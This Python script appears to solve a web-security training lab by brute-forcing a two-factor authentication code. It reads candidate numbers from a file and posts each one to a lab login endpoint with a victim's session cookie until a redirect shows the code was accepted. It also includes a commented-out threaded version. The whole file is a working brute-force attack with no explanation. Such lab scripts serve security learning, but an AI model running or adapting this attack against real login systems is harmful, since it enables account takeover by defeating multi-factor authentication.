#!/bin/python3

import os
import requests
#import threading

f = open("./passwords.txt",'r')
passwords = f.readlines()

f = open("./usernames.txt",'r')
usernames = f.readlines()

f = open("./numbers.txt",'r')
numbers = f.readlines()


def cracking():
    print("<CRACKING LOGIN>")
    for mfa in numbers:
        cookies = {
            'verify': 'carlos',
            'session': 'RyxpXm6NdiaYHcpOkXueiTrvA7FH8CPU'
        }

        headers = {}

        data = {
            'mfa-code': mfa
        }

        response = requests.post('https://0aff006903fc6624c06544bb0014002e.web-security-academy.net/login2', cookies=cookies, headers=headers, data=data, verify=True, allow_redirects=False)
        if response.status_code == 302:
            print("\nCRACKED\n" + "MFA number is: " + mfa)
            return
        else:
            print("Checking MFA number: " + mfa + "        ", end="\r")

cracking()

#threads = []
#for mfa in numbers:
#    t = threading.Thread(target=cracking, args=(mfa,))
#    threads.append(t)
#    t.start()
